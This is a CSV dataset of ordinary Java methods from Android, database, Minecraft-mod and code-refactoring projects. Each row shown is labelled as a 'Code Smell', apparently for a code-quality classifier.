text,label,text_label
"private void showShareAlert(ArrayList<MessageObject> messages){
  final FrameLayout photoContainerView=containerView;
  requestAdjustToNothing();
  boolean openKeyboardOnShareAlertClose=false;
  if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null && parentChatActivity.getFragmentView() != null) {
    boolean keyboardVisible=parentChatActivity.getChatActivityEnterView().isKeyboardVisible();
    if (keyboardVisible) {
      parentChatActivity.getChatActivityEnterView().showEmojiView();
      openKeyboardOnShareAlertClose=true;
    }
    AndroidUtilities.setAdjustResizeToNothing(parentChatActivity.getParentActivity(),classGuid);
    parentChatActivity.getFragmentView().requestLayout();
  }
  final boolean finalOpenKeyboardOnShareAlertClose=openKeyboardOnShareAlertClose;
  ShareAlert alert=new ShareAlert(parentActivity,parentChatActivity,messages,null,null,false,null,null,false,true,null){
    @Override protected void onSend(    LongSparseArray<TLRPC.Dialog> dids,    int count,    TLRPC.TL_forumTopic topic){
      AndroidUtilities.runOnUIThread(() -> {
        BulletinFactory.createForwardedBulletin(parentActivity,photoContainerView,dids.size(),dids.size() == 1 ? dids.valueAt(0).id : 0,count,0xf9222222,0xffffffff).show();
      }
,250);
    }
    @Override public void dismissInternal(){
      super.dismissInternal();
      if (finalOpenKeyboardOnShareAlertClose) {
        AndroidUtilities.runOnUIThread(() -> {
          if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null) {
            parentChatActivity.getChatActivityEnterView().openKeyboard();
          }
        }
,50);
      }
      requestAdjust();
    }
  }
;
  alert.setFocusable(false);
  alert.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_NOTHING);
  AndroidUtilities.runOnUIThread(() -> {
    if (alert != null && alert.getWindow() != null) {
      alert.setFocusable(true);
      if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null) {
        parentChatActivity.getChatActivityEnterView().hidePopup(false);
      }
    }
  }
,AdjustPanLayoutHelper.keyboardDuration);
  alert.show();
}",1,Code Smell
"private void paintClickView(Graphics2D graphics2D){
  graphics2D.scale(mScaleRatio,mScaleRatio);
  if (mScaleRatio > 1) {
    graphics2D.translate(mTransX,mTransY);
  }
  drawScreenImage(graphics2D);
  drawClickView(graphics2D,mClickedView,0);
  if (mCurrentMode != SearchableJTree.MODE_SHIFT && mCurrentMouseX > -1 && mCurrentMouseY > -1) {
    if (mScaleRatio > 1) {
      graphics2D.translate(-mTransX,-mTransY);
    }
    graphics2D.scale(1 / mScaleRatio,1 / mScaleRatio);
    int phoneX=Math.max(CoordinateUtils.convertPanelXToPhoneX(mApplication,mCurrentMouseX,mScaleRatio,mTransX),0);
    int phoneY=Math.max(CoordinateUtils.convertPanelYToPhoneY(mApplication,mCurrentMouseY,mScaleRatio,mTransY),0);
    String paintText=""X: "" + phoneX + "", Y: ""+ phoneY;
    final int width=graphics2D.getFontMetrics().stringWidth(paintText) + 12;
    graphics2D.setColor(mTextBgColor);
    graphics2D.fillRect(0,0,width,20);
    graphics2D.setColor(mNormalTextColor);
    graphics2D.drawString(paintText,6,15);
  }
  if (mCurrentMode == SearchableJTree.MODE_NORMAL && showAllClickableArea) {
    showAllClickableAreaView(graphics2D,mCodeLocatorWindow.getCurrentSelectView());
  }
}",1,Code Smell
"private Object process(Object obj) throws Throwable {
  if (obj instanceof Map) {
    Map paramMap=(Map)obj;
    for (    Object key : paramMap.keySet()) {
      if (paramMap.get(key) != null) {
        paramMap.put(key,process(paramMap.get(key)));
      }
    }
    return paramMap;
  }
  Map<String,Map<String,MybatisInterceptorConfig>> localInterceptorConfigMap=getConfig(obj);
  if (isEmpty(localInterceptorConfigMap)) {
    return obj;
  }
  Object newObject=obj.getClass().newInstance();
  BeanUtils.copyBean(newObject,obj);
  for (  String attrName : localInterceptorConfigMap.keySet()) {
    if (isEmpty(localInterceptorConfigMap.get(attrName))) {
      continue;
    }
    MybatisInterceptorConfig interceptorConfig=localInterceptorConfigMap.get(attrName).get(Methods.encrypt.name());
    if (interceptorConfig == null || StringUtils.isBlank(interceptorConfig.getInterceptorClass()) || StringUtils.isBlank(interceptorConfig.getInterceptorMethod())) {
      continue;
    }
    Object fieldValue=BeanUtils.getFieldValueByName(interceptorConfig.getAttrName(),newObject);
    if (fieldValue != null) {
      Class<?> processClazz=Class.forName(interceptorConfig.getInterceptorClass());
      Method method=processClazz.getMethod(interceptorConfig.getInterceptorMethod(),Object.class);
      Object processedValue=method.invoke(null,fieldValue);
      if (processedValue instanceof byte[]) {
        BeanUtils.setFieldValueByName(newObject,interceptorConfig.getAttrName(),processedValue,byte[].class);
      }
 else {
        BeanUtils.setFieldValueByName(newObject,interceptorConfig.getAttrName(),processedValue,fieldValue.getClass());
      }
    }
  }
  return newObject;
}
",1,Code Smell
"private boolean isSqlQuoteIdentifierRequiredFor(String name){
  if (forceSqlQuoteIdentifierUsage)   return true;
  for (int i=0; i < name.length(); i++) {
    if (casing == Casing.TO_UPPER && Character.isLowerCase(name.charAt(i)) || casing == Casing.TO_LOWER && Character.isUpperCase(name.charAt(i)) || name.charAt(i) == openSqlIdentifier || name.charAt(i) == closeSqlIdentifier || name.charAt(i) == DEFAULT_CATALOG_SEPARATOR) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"private void putToAllStories(long dialogId,TL_stories.PeerStories stories){
  TL_stories.PeerStories old=allStoriesMap.get(dialogId);
  if (old != null && old.stories != null && !old.stories.isEmpty() && stories != null && stories.stories != null && !stories.stories.isEmpty()) {
    for (int i=0; i < stories.stories.size(); ++i) {
      if (stories.stories.get(i) instanceof TL_stories.TL_storyItemSkipped) {
        int storyId=stories.stories.get(i).id;
        for (int j=0; j < old.stories.size(); ++j) {
          if (old.stories.get(j).id == storyId && old.stories.get(j) instanceof TL_stories.TL_storyItem) {
            stories.stories.set(i,old.stories.get(j));
            break;
          }
        }
      }
    }
  }
  allStoriesMap.put(dialogId,stories);
}",1,Code Smell
"public void extractData(Long datasourceId,Long taskId,JobExecutionContext context){
  CoreDatasource coreDatasource=datasourceMapper.selectById(datasourceId);
  if (coreDatasource == null) {
    LogUtil.error(""Can not find datasource: "" + datasourceId);
    return;
  }
  CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectById(taskId);
  if (coreDatasourceTask == null) {
    return;
  }
  datasourceTaskServer.checkTaskIsStopped(coreDatasourceTask);
  if (StringUtils.isNotEmpty(coreDatasourceTask.getTaskStatus()) && (coreDatasourceTask.getTaskStatus().equalsIgnoreCase(TaskStatus.Stopped.name()) || coreDatasourceTask.getTaskStatus().equalsIgnoreCase(TaskStatus.Suspend.name()))) {
    LogUtil.info(""Skip synchronization task: {} ,due to task status is {}"",coreDatasourceTask.getId(),coreDatasourceTask.getTaskStatus());
    return;
  }
  if (datasourceTaskServer.existUnderExecutionTask(datasourceId,coreDatasourceTask.getId())) {
    LogUtil.info(""Skip synchronization task for datasource due to exist others, datasource ID : "" + datasourceId);
    return;
  }
  DatasourceServer.UpdateType updateType=DatasourceServer.UpdateType.valueOf(coreDatasourceTask.getUpdateType());
  if (context != null) {
    UpdateWrapper<CoreDatasource> updateWrapper=new UpdateWrapper<>();
    updateWrapper.eq(""id"",datasourceId);
    CoreDatasource record=new CoreDatasource();
    record.setQrtzInstance(context.getFireInstanceId());
    datasourceMapper.update(record,updateWrapper);
  }
  extractedData(taskId,coreDatasource,updateType,coreDatasourceTask.getSyncRate());
  try {
    datasourceTaskServer.updateTaskStatus(coreDatasourceTask);
    updateDsTaskStatus(datasourceId);
  }
 catch (  Exception ignore) {
    LogUtil.error(ignore);
  }
}
",1,Code Smell
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  script.append(""ALTER TABLE "");
  if (StringUtils.isNotBlank(oldTable.getDatabaseName())) {
    script.append(""`"").append(oldTable.getDatabaseName()).append(""`"").append(""."");
  }
  script.append(""`"").append(oldTable.getName()).append(""`"").append(""\n"");
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""\t"").append(""RENAME TO "").append(""`"").append(newTable.getName()).append(""`"").append("",\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append(""\t"").append(""COMMENT="").append(""'"").append(newTable.getComment()).append(""'"").append("",\n"");
  }
  if (oldTable.getIncrementValue() != newTable.getIncrementValue()) {
    script.append(""\t"").append(""AUTO_INCREMENT="").append(newTable.getIncrementValue()).append("",\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus()) && StringUtils.isNotBlank(tableColumn.getColumnType()) && StringUtils.isNotBlank(tableColumn.getName())) {
      MysqlColumnTypeEnum typeEnum=MysqlColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("",\n"");
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      MysqlIndexTypeEnum mysqlIndexTypeEnum=MysqlIndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("",\n"");
    }
  }
  script.append(buildGenerateReorderColumnSql(oldTable,newTable));
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",1,Code Smell
"@Override protected void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (Build.VERSION.SDK_INT >= 23 && Build.VERSION.SDK_INT < 29 && !isStorageAllowed(this))   requestStoragePermission();
 else   exit();
}",1,Code Smell
"@Override public void onSharedPreferenceChanged(final SharedPreferences prefs,final String key){
  if (Settings.PREF_USE_CONTACTS.equals(key) && prefs.getBoolean(key,false) && !PermissionsUtil.checkAllPermissionsGranted(getActivity(),Manifest.permission.READ_CONTACTS)) {
    get(requireContext()).requestPermissions(this,getActivity(),Manifest.permission.READ_CONTACTS);
  }
 else   if (Settings.PREF_KEY_USE_PERSONALIZED_DICTS.equals(key) && !prefs.getBoolean(key,true)) {
    new AlertDialog.Builder(requireContext()).setMessage(R.string.disable_personalized_dicts_message).setNegativeButton(android.R.string.cancel,(dialogInterface,i) -> ((TwoStatePreference)findPreference(key)).setChecked(true)).setPositiveButton(android.R.string.ok,null).setOnCancelListener(dialogInterface -> ((TwoStatePreference)findPreference(key)).setChecked(true)).show();
  }
 else   if (Settings.PREF_SHOW_SUGGESTIONS.equals(key) && !prefs.getBoolean(key,true)) {
    ((TwoStatePreference)findPreference(Settings.PREF_ALWAYS_SHOW_SUGGESTIONS)).setChecked(false);
  }
  refreshEnabledSettings();
}
",1,Code Smell
"public boolean probablyRingtone(){
  if (getDocument() != null && RingtoneDataStore.ringtoneSupportedMimeType.contains(getDocument().mime_type) && getDocument().size < MessagesController.getInstance(currentAccount).ringtoneSizeMax * 2) {
    for (int a=0; a < getDocument().attributes.size(); a++) {
      TLRPC.DocumentAttribute attribute=getDocument().attributes.get(a);
      if (attribute instanceof TLRPC.TL_documentAttributeAudio) {
        if (attribute.duration < 60) {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"private void openDialogsToSend(boolean animated){
  Bundle args=new Bundle();
  args.putBoolean(""onlySelect"",true);
  args.putBoolean(""canSelectTopics"",true);
  args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_FORWARD);
  args.putBoolean(""allowSwitchAccount"",true);
  if (contactsToSend != null) {
    if (contactsToSend.size() != 1) {
      args.putString(""selectAlertString"",LocaleController.getString(""SendContactToText"",R.string.SendMessagesToText));
      args.putString(""selectAlertStringGroup"",LocaleController.getString(""SendContactToGroupText"",R.string.SendContactToGroupText));
    }
  }
 else {
    args.putString(""selectAlertString"",LocaleController.getString(""SendMessagesToText"",R.string.SendMessagesToText));
    args.putString(""selectAlertStringGroup"",LocaleController.getString(""SendMessagesToGroupText"",R.string.SendMessagesToGroupText));
  }
  DialogsActivity fragment=new DialogsActivity(args){
    @Override public boolean shouldShowNextButton(    DialogsActivity dialogsFragment,    ArrayList<Long> dids,    CharSequence message,    boolean param){
      if (exportingChatUri != null) {
        return false;
      }
      if (contactsToSend != null && contactsToSend.size() == 1 && !mainFragmentsStack.isEmpty()) {
        return true;
      }
      if (dids.size() <= 1) {
        return videoPath != null || photoPathsArray != null && photoPathsArray.size() > 0;
      }
      return false;
    }
  }
;
  fragment.setDelegate(this);
  boolean removeLast;
  if (AndroidUtilities.isTablet()) {
    removeLast=layersActionBarLayout.getFragmentStack().size() > 0 && layersActionBarLayout.getFragmentStack().get(layersActionBarLayout.getFragmentStack().size() - 1) instanceof DialogsActivity;
  }
 else {
    removeLast=actionBarLayout.getFragmentStack().size() > 1 && actionBarLayout.getFragmentStack().get(actionBarLayout.getFragmentStack().size() - 1) instanceof DialogsActivity;
  }
  getActionBarLayout().presentFragment(fragment,removeLast,!animated,true,false);
  if (SecretMediaViewer.hasInstance() && SecretMediaViewer.getInstance().isVisible()) {
    SecretMediaViewer.getInstance().closePhoto(false,false);
  }
 else   if (PhotoViewer.hasInstance() && PhotoViewer.getInstance().isVisible()) {
    PhotoViewer.getInstance().closePhoto(false,true);
  }
 else   if (ArticleViewer.hasInstance() && ArticleViewer.getInstance().isVisible()) {
    ArticleViewer.getInstance().close(false,true);
  }
  StoryRecorder.destroyInstance();
  if (GroupCallActivity.groupCallInstance != null) {
    GroupCallActivity.groupCallInstance.dismiss();
  }
  if (!animated) {
    drawerLayoutContainer.setAllowOpenDrawer(false,false);
    if (AndroidUtilities.isTablet()) {
      actionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
      rightActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
    }
 else {
      drawerLayoutContainer.setAllowOpenDrawer(true,false);
    }
  }
}",1,Code Smell
"private Space indentTo(Space space,int column,Space.Location spaceLocation){
  Space s=space;
  String whitespace=s.getWhitespace();
  if (spaceLocation == Space.Location.COMPILATION_UNIT_PREFIX && !StringUtils.isNullOrEmpty(whitespace)) {
    s=s.withWhitespace("""");
  }
 else   if (s.getComments().isEmpty() && !s.getLastWhitespace().contains(""\n"")) {
    return s;
  }
  if (s.getComments().isEmpty()) {
    int indent=findIndent(s);
    if (indent != column) {
      int shift=column - indent;
      s=s.withWhitespace(indent(whitespace,shift));
    }
  }
 else {
    boolean hasFileLeadingComment=!space.getComments().isEmpty() && (spaceLocation == Space.Location.COMPILATION_UNIT_PREFIX || (spaceLocation == Space.Location.CLASS_DECLARATION_PREFIX && space.getComments().get(0).isMultiline()));
    int finalColumn=spaceLocation == Space.Location.BLOCK_END ? column + style.getIndentSize() : column;
    String lastIndent=space.getWhitespace().substring(space.getWhitespace().lastIndexOf('\n') + 1);
    int indent=getLengthOfWhitespace(StringUtils.indent(lastIndent));
    if (indent != finalColumn) {
      if (hasFileLeadingComment || whitespace.contains(""\n"") && !(!s.getComments().isEmpty() && s.getComments().get(0) instanceof TextComment && !s.getComments().get(0).isMultiline()&& getLengthOfWhitespace(s.getWhitespace()) == 0)) {
        int shift=finalColumn - indent;
        s=s.withWhitespace(whitespace.substring(0,whitespace.lastIndexOf('\n') + 1) + indent(lastIndent,shift));
      }
      Space finalSpace=s;
      int lastCommentPos=s.getComments().size() - 1;
      s=s.withComments(ListUtils.map(s.getComments(),(i,c) -> {
        if (c instanceof TextComment && !c.isMultiline()) {
          if ((i != lastCommentPos) && getLengthOfWhitespace(c.getSuffix()) == 0) {
            return c;
          }
        }
        String priorSuffix=i == 0 ? space.getWhitespace() : finalSpace.getComments().get(i - 1).getSuffix();
        int toColumn=spaceLocation == Space.Location.BLOCK_END && i != finalSpace.getComments().size() - 1 ? column + style.getIndentSize() : column;
        Comment c2=c;
        if (priorSuffix.contains(""\n"") || hasFileLeadingComment) {
          c2=indentComment(c,priorSuffix,toColumn);
        }
        if (c2.getSuffix().contains(""\n"")) {
          int suffixIndent=getLengthOfWhitespace(c2.getSuffix());
          int shift=toColumn - suffixIndent;
          c2=c2.withSuffix(indent(c2.getSuffix(),shift));
        }
        return c2;
      }
));
    }
  }
  return s;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public static void onEntityMoved(LivingEntity living,Level worldIn,BlockPos pos,int level){
  if (living.onGround()) {
    BlockState blockstate=Blocks.FROSTED_ICE.defaultBlockState();
    int f=Math.min(16,2 + level);
    BlockPos.MutableBlockPos blockpos$mutable=new BlockPos.MutableBlockPos();
    for (    BlockPos blockpos : BlockPos.betweenClosed(pos.offset(-f,-1,-f),pos.offset(f,-1,f))) {
      if (blockpos.closerToCenterThan(living.position(),f)) {
        blockpos$mutable.set(blockpos.getX(),blockpos.getY() + 1,blockpos.getZ());
        BlockState blockstate1=worldIn.getBlockState(blockpos$mutable);
        if (blockstate1.isAir()) {
          BlockState blockstate2=worldIn.getBlockState(blockpos);
          if (blockstate2 == FrostedIceBlock.meltsInto() && blockstate.canSurvive(worldIn,blockpos) && worldIn.isUnobstructed(blockstate,blockpos,CollisionContext.empty()) && !((WorldBridge)worldIn).bridge$forge$onBlockPlace(blockpos,living,Direction.UP)) {
            if (CraftEventFactory.handleBlockFormEvent(worldIn,blockpos,blockstate,living)) {
              worldIn.scheduleTick(blockpos,Blocks.FROSTED_ICE,Mth.nextInt(living.getRandom(),60,120));
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override protected void onHiddenLinkClicked(){
  String text;
  if ((slug == null || slug.isEmpty()) && giftCode.to_id == NO_USER_ID) {
    text=LocaleController.getString(""BoostingOnlyGiveawayCreatorSeeLink"",R.string.BoostingOnlyGiveawayCreatorSeeLink);
  }
 else {
    text=LocaleController.getString(""BoostingOnlyRecipientCode"",R.string.BoostingOnlyRecipientCode);
  }
  BulletinFactory.of(container,resourcesProvider).createSimpleBulletin(R.raw.chats_infotip,text).show(true);
}
",1,Code Smell
"private FileAppenderFactory<RowData> createRowDataFileAppenderFactory(Table table,RowType flinkSchema,List<Integer> equalityFieldIds,boolean upsert,boolean appendMode){
  if (equalityFieldIds == null || equalityFieldIds.isEmpty() || appendMode) {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec);
  }
 else   if (upsert) {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec,ArrayUtil.toIntArray(equalityFieldIds),TypeUtil.select(schema,Sets.newHashSet(equalityFieldIds)),null);
  }
 else {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec,ArrayUtil.toIntArray(equalityFieldIds),schema,null);
  }
}
",1,Code Smell
"@Test public void testUserDisassociationForNotAuthRecipes() throws Exception {
  if (StorageLayer.getStorage(process.getProcess()).getType() != STORAGE_TYPE.SQL) {
    return;
  }
  createTenants();
  Reflections reflections=new Reflections(""io.supertokens.pluginInterface"");
  Set<Class<? extends NonAuthRecipeStorage>> classes=reflections.getSubTypesOf(NonAuthRecipeStorage.class);
  List<String> names=classes.stream().map(Class::getCanonicalName).collect(Collectors.toList());
  List<String> classNames=new ArrayList<>();
  for (  String name : names) {
    if (name.contains(""SQLStorage"")) {
      continue;
    }
    if (name.equals(UserMetadataStorage.class.getName()) || name.equals(JWTRecipeStorage.class.getName()) || name.equals(ActiveUsersStorage.class.getName())) {
      continue;
    }
    classNames.add(name);
  }
  TenantIdentifier t2=new TenantIdentifier(null,""a1"",""t2"");
  for (  String className : classNames) {
    String userId=""userId"";
    StorageLayer.getStorage(t2,process.main).addInfoToNonAuthRecipesBasedOnUserId(t2,className,userId);
    JsonObject response=TestMultitenancyAPIHelper.disassociateUserFromTenant(t2,userId,process.getProcess());
    assertEquals(""OK"",response.getAsJsonPrimitive(""status"").getAsString());
    assertTrue(response.get(""wasAssociated"").getAsBoolean());
  }
}",1,Code Smell
"@IsLogin public PageResponseModel<MessagePageResponse> page(PageRequestModel<MessagePageRequest> pageRequestModel){
  MessagePageRequest pageRequest=pageRequestModel.getFilter();
  Message message=Message.builder().channel(MessageChannelEn.STATION_LETTER).receiver(IdValue.builder().id(LoginUserContext.getUser().getId().toString()).build()).type(MessageTypeEn.getEntityByDesc(pageRequest.getTypeDesc())).build();
  PageResult<Message> pageResult=messageRepository.page(PageUtil.buildPageRequest(pageRequestModel,message));
  if (ObjectUtils.isEmpty(pageResult.getList())) {
    return PageResponseModel.build(pageResult.getTotal(),pageResult.getSize(),new ArrayList<>());
  }
  Set<Long> userIds=new HashSet<>();
  Set<Long> postsIds=new HashSet<>();
  SafesUtil.ofList(pageResult.getList()).forEach(message1 -> {
    userIds.add(Long.valueOf(message1.getSender().getId()));
    if (MessageTypeEn.APPROVAL_ARTICLE.equals(message.getType()) || MessageTypeEn.APPROVAL_FAQ.equals(message.getType()) || MessageTypeEn.COMMENT_FAQ.equals(message.getType())|| MessageTypeEn.COMMENT_ARTICLE.equals(message.getType())) {
      postsIds.add(Long.valueOf(message1.getTitle()));
    }
  }
);
  List<User> users=userRepository.queryByIds(new ArrayList<>(userIds));
  List<BasePosts> postsList=new ArrayList<>();
  if (!ObjectUtils.isEmpty(postsIds)) {
    postsList=postsRepository.queryInIds(postsIds);
  }
  List<MessagePageResponse> responses=MessageTransfer.toMessagePageResponses(pageResult.getList(),users,postsList,LoginUserContext.getUser());
  return PageResponseModel.build(pageResult.getTotal(),pageResult.getSize(),responses);
}",1,Code Smell
"@Override public boolean onScroll(@NonNull MotionEvent e1,@NonNull MotionEvent e2,float distanceX,float distanceY){
  float dx=e1.getX() - e2.getX();
  float dy=e1.getY() - e2.getY();
  if (Math.abs(dx) > AndroidUtilities.getPixelsInCM(0.4f,true) && Math.abs(dx) / 3 > dy && startDragging && !lockDragging) {
    startDragging=false;
    Runnable action=() -> {
      if (dx > 0) {
        if (realCurrentPage < 2) {
          setCurrentPage(realCurrentPage + 1,true);
        }
      }
 else {
        if (realCurrentPage > 0) {
          setCurrentPage(realCurrentPage - 1,true);
        }
      }
      lockDragging=false;
    }
;
    if (scrollAnimator != null) {
      lockDragging=true;
      AndroidUtilities.runOnUIThread(action,scrollAnimator.getDuration() - scrollAnimator.getCurrentPlayTime() + 50);
    }
 else {
      action.run();
    }
  }
  return super.onScroll(e1,e2,distanceX,distanceY);
}",1,Code Smell
"public static int process(char[] str,int index,HashSet<Integer> lights){
  if (index == str.length) {
    for (int i=0; i < str.length; i++) {
      if (str[i] != 'X') {
        if (!lights.contains(i - 1) && !lights.contains(i) && !lights.contains(i + 1)) {
          return Integer.MAX_VALUE;
        }
      }
    }
    return lights.size();
  }
 else {
    int no=process(str,index + 1,lights);
    int yes=Integer.MAX_VALUE;
    if (str[index] == '.') {
      lights.add(index);
      yes=process(str,index + 1,lights);
      lights.remove(index);
    }
    return Math.min(no,yes);
  }
}",1,Code Smell
"private static void assertValidTypes(TypeValidation typeValidation,J sf){
  if (typeValidation.identifiers() || typeValidation.methodInvocations() || typeValidation.methodDeclarations()|| typeValidation.classDeclarations()|| typeValidation.constructorInvocations()) {
    List<FindMissingTypes.MissingTypeResult> missingTypeResults=FindMissingTypes.findMissingTypes(sf);
    missingTypeResults=missingTypeResults.stream().filter(missingType -> {
      if (missingType.getJ() instanceof J.Identifier) {
        return typeValidation.identifiers();
      }
 else       if (missingType.getJ() instanceof J.ClassDeclaration) {
        return typeValidation.classDeclarations();
      }
 else       if (missingType.getJ() instanceof J.MethodInvocation || missingType.getJ() instanceof J.MemberReference) {
        return typeValidation.methodInvocations();
      }
 else       if (missingType.getJ() instanceof J.NewClass) {
        return typeValidation.constructorInvocations();
      }
 else       if (missingType.getJ() instanceof J.MethodDeclaration) {
        return typeValidation.methodDeclarations();
      }
 else       if (missingType.getJ() instanceof J.VariableDeclarations.NamedVariable) {
        return typeValidation.variableDeclarations();
      }
 else {
        return true;
      }
    }
).collect(Collectors.toList());
    if (!missingTypeResults.isEmpty()) {
      throw new IllegalStateException(""LST contains missing or invalid type information\n"" + missingTypeResults.stream().map(v -> v.getPath() + ""\n"" + v.getPrintedTree()).collect(Collectors.joining(""\n\n"")));
    }
  }
}
",1,Code Smell
"private boolean playChannel(int channelGroupIndex,int liveChannelIndex,boolean changeSource){
  if ((channelGroupIndex == currentChannelGroupIndex && liveChannelIndex == currentLiveChannelIndex && !changeSource) || (changeSource && currentLiveChannelItem.getSourceNum() == 1)) {
    showChannelInfo();
    return true;
  }
  mVideoView.release();
  if (!changeSource) {
    currentChannelGroupIndex=channelGroupIndex;
    currentLiveChannelIndex=liveChannelIndex;
    currentLiveChannelItem=getLiveChannels(currentChannelGroupIndex).get(currentLiveChannelIndex);
    Hawk.put(HawkConfig.LIVE_CHANNEL,currentLiveChannelItem.getChannelName());
    livePlayerManager.getLiveChannelPlayer(mVideoView,currentLiveChannelItem.getChannelName());
  }
  mVideoView.setUrl(currentLiveChannelItem.getUrl());
  showChannelInfo();
  mVideoView.start();
  return true;
}",1,Code Smell
"private void insertOrUpdate(T item,String statement) throws SQLException {
  String parsedStatement=parse(statement);
  try (PreparedStatement ps=connection.prepareStatement(parsedStatement)){
    setParams(ps,item);
    final int updated=ps.executeUpdate();
    if (updated != 1) {
      throw concurrentDatabaseModificationException(item,updated);
    }
  }
 catch (  SQLException e) {
    String lowerCaseMessage=e.getMessage().toLowerCase();
    if (e.getErrorCode() == -803 || lowerCaseMessage.contains(""duplicate"") || lowerCaseMessage.contains(""primary key"") || lowerCaseMessage.contains(""unique constraint"")) {
      throw concurrentDatabaseModificationException(item,0);
    }
    throw e;
  }
}",1,Code Smell
"@Override public String signature(@Nullable Object t){
  return signature((Type)t);
}
private String signature(@Nullable Type type){
  if (type == null || type instanceof Type.UnknownType || type instanceof NullType) {
    return ""{undefined}"";
  }
 else   if (type instanceof Type.IntersectionClassType) {
    return intersectionSignature(type);
  }
 else   if (type instanceof Type.ClassType) {
    try {
      return ((Type.ClassType)type).typarams_field != null && ((Type.ClassType)type).typarams_field.length() > 0 ? parameterizedSignature(type) : classSignature(type);
    }
 catch (    Symbol.CompletionFailure ignored) {
      return ((Type.ClassType)type).typarams_field != null && ((Type.ClassType)type).typarams_field.length() > 0 ? parameterizedSignature(type) : classSignature(type);
    }
  }
 else   if (type instanceof Type.CapturedType) {
    return signature(((Type.CapturedType)type).wildcard);
  }
 else   if (type instanceof Type.TypeVar) {
    return genericSignature(type);
  }
 else   if (type instanceof Type.JCPrimitiveType) {
    return primitiveSignature(type);
  }
 else   if (type instanceof Type.JCVoidType) {
    return ""void"";
  }
 else   if (type instanceof Type.ArrayType) {
    return arraySignature(type);
  }
 else   if (type instanceof Type.WildcardType) {
    Type.WildcardType wildcard=(Type.WildcardType)type;
    StringBuilder s=new StringBuilder(""Generic{"" + wildcard.kind.toString());
    if (!type.isUnbound()) {
      s.append(signature(wildcard.type));
    }
    return s.append(""}"").toString();
  }
 else   if (type instanceof Type.JCNoType) {
    return ""{none}"";
  }
 else   if (type instanceof Type.AnnotatedType) {
    return signature(type.unannotatedType());
  }
  throw new IllegalStateException(""Unexpected type "" + type.getClass().getName());
}",1,Code Smell
